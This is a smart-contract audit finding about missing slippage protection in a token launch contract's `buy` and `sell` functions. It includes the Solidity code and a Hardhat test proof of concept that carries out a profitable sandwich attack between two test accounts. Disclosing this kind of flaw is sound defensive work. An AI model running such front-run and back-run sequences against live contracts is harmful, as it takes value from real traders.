## Description
The `buy` and `sell` functions allow users to buy/sell agent tokens. However, these functions have no slippage protection implemented which leaves users vulnerable to front-running attacks impacting price and leaves them vulnerable to sandwich attacks.

## Vulnerability Details
The `buy` and `sell` functions allow users to buy/sell agent tokens.

```solidity
function buy(
    uint256 amountIn_,
    address tokenAddress_
) external payable returns (bool) {
    require(agentTokens[tokenAddress_].isTrading, "Trading not active");

    address pairAddress = factory.getPair(
        tokenAddress_,
        router.assetToken()
    );

    IPair pair = IPair(pairAddress);
    (uint256 reserveA, uint256 reserveB) = pair.getReserves();

    (uint256 amount1In, uint256 amount0Out) = router.buy(
        amountIn_,
        tokenAddress_,
        msg.sender
    );

    uint256 newReserveA = reserveA - amount0Out;
    uint256 newReserveB = reserveB + amount1In;

    _updateMetrics(
        tokenAddress_,
        newReserveA,
        newReserveB,
        amount1In
    );

    uint256 totalSupply = IERC20(tokenAddress_).totalSupply();
    require(totalSupply > 0, "Invalid total supply");

    uint256 reservePercentage = (newReserveA * 100) / totalSupply;
    
    if (reservePercentage <= gradThresholdPercent) {
        _graduate(tokenAddress_);
    }

    return true;
}

function sell(
    uint256 amountIn_,
    address tokenAddress_
) external returns (bool) {
    require(agentTokens[tokenAddress_].isTrading, "Trading not active");

    address pairAddress = factory.getPair(
        tokenAddress_,
        router.assetToken()
    );

    IPair pair = IPair(pairAddress);
    (uint256 reserveA, uint256 reserveB) = pair.getReserves();
    
    (uint256 amount0In, uint256 amount1Out) = router.sell(
        amountIn_,
        tokenAddress_,
        msg.sender
    );

    _updateMetrics(
        tokenAddress_,
        reserveA + amount0In,
        reserveB - amount1Out,
        amount1Out
    );

    return true;
}
```

As observed in these functions, there are no parameters implemented such as `minAmountOut` that would protect users from slippage. This leaves users highly vulnerable to front-running impacting the price and sandwich attacks that lead to attackers profiting.

## Proof of Concept
Implement the following test in the `Manager.test.ts` file and run it to observe the vulnerability through the logs.

```typescript
describe("MEV Attacks", function() {
    it.only("demonstrates successful sandwich attack", async function() {
        const { manager, router, factory, alice, bob, assetToken } = context;
        
        console.log("\n=== Starting Sandwich Attack Test ===");

        // Initial setup - track exact balances
        const initialBalance = ethers.parseEther("10000");
        await assetToken.transfer(await alice.getAddress(), initialBalance);
        await assetToken.transfer(await bob.getAddress(), initialBalance);

        const aliceStartBalance = await assetToken.balanceOf(await alice.getAddress());
        const bobStartBalance = await assetToken.balanceOf(await bob.getAddress());
        console.log("\nInitial Balances:");
        console.log("Alice's starting USDC:", ethers.formatEther(aliceStartBalance));
        console.log("Bob's starting USDC:", ethers.formatEther(bobStartBalance));

        // 1. Alice launches token
        const launchAmount = ethers.parseEther("100");
        await assetToken.connect(alice).approve(await manager.getAddress(), launchAmount);
        const tx = await manager.connect(alice).launch(
            "Test Token", "TEST", "Test prompt", "Test intention", "https://test.com", launchAmount
        );
        
        const aliceBalanceAfterLaunch = await assetToken.balanceOf(await alice.getAddress());
        console.log("\nAfter Launch:");
        console.log("Alice's USDC spent on launch:", ethers.formatEther(aliceStartBalance - aliceBalanceAfterLaunch));
        
        const receipt = await tx.wait();
        const event = receipt.logs.find(log => log.fragment?.name === "Launched");
        const agentToken = await ethers.getContractAt("Token", event.args.token);
        
        const pair = await ethers.getContractAt("IPair", await factory.getPair(await agentToken.getAddress(), await assetToken.getAddress()));

        // 2. Bob front-runs
        const frontrunAmount = ethers.parseEther("50");
        await assetToken.connect(bob).approve(await router.getAddress(), frontrunAmount);
        const bobUsdcBeforeFrontrun = await assetToken.balanceOf(await bob.getAddress());
        await manager.connect(bob).buy(frontrunAmount, await agentToken.getAddress());
        
        const bobAgentBalance = await agentToken.balanceOf(await bob.getAddress());
        const bobUsdcAfterFrontrun = await assetToken.balanceOf(await bob.getAddress());
        const [midReserveAgent, midReserveAsset] = await pair.getReserves();
        console.log("\nAfter Front-run:");
        console.log("Bob's USDC spent:", ethers.formatEther(bobUsdcBeforeFrontrun - bobUsdcAfterFrontrun));
        console.log("Bob received:", ethers.formatEther(bobAgentBalance), "tokens");
        
        // 3. Alice (victim) buys
        const victimAmount = ethers.parseEther("500");
        const aliceUsdcBeforeBuy = await assetToken.balanceOf(await alice.getAddress());
        const aliceInitialAgentBalance = await agentToken.balanceOf(await alice.getAddress());
        
        await assetToken.connect(alice).approve(await router.getAddress(), victimAmount);
        await manager.connect(alice).buy(victimAmount, await agentToken.getAddress());
        
        const aliceUsdcAfterBuy = await assetToken.balanceOf(await alice.getAddress());
        const aliceFinalAgentBalance = await agentToken.balanceOf(await alice.getAddress());
        const aliceReceivedAmount = aliceFinalAgentBalance - aliceInitialAgentBalance;
        
        const [postVictimReserveAgent, postVictimReserveAsset] = await pair.getReserves();
        console.log("\nAfter Victim Buy:");
        console.log("Alice's launch tokens:", ethers.formatEther(aliceInitialAgentBalance));
        console.log("Alice's USDC spent on buy:", ethers.formatEther(aliceUsdcBeforeBuy - aliceUsdcAfterBuy));
        console.log("Alice received from buy:", ethers.formatEther(aliceReceivedAmount), "tokens");
        
        // 5. Bob back-runs by selling front-run tokens
        await agentToken.connect(bob).approve(await router.getAddress(), bobAgentBalance);
        await manager.connect(bob).sell(bobAgentBalance, await agentToken.getAddress());
        
        // Calculate exact profits/losses
        const bobUsdcFinal = await assetToken.balanceOf(await bob.getAddress());
        const bobProfit = bobUsdcFinal - bobStartBalance;
        const aliceTotalSpent = aliceStartBalance - aliceUsdcAfterBuy;
        
        const [finalReserveAgent, finalReserveAsset] = await pair.getReserves();
        
        console.log("\nBob's Attack Results:");
        console.log("Starting USDC:", ethers.formatEther(bobStartBalance));
        console.log("Final USDC:", ethers.formatEther(bobUsdcFinal));
        console.log("Actual profit:", ethers.formatEther(bobProfit), "USDC");
        console.log("ROI:", (Number(bobProfit) / Number(frontrunAmount) * 100).toFixed(2), "%");
        
        // Verify attack was profitable
        expect(Number(bobProfit)).to.be.gt(0);
        
        console.log("\n=== Sandwich Attack Test Complete ===");
    });
});
```

## Impact  
No slippage protection leaves users vulnerable to front-running attacks moving the price and sandwich attacks that profit at the cost of these vulnerable users.

## Recommendation  
Introduce a new parameter to implement slippage protection in the functions to make sure that users do not receive less tokens than what they intend to.
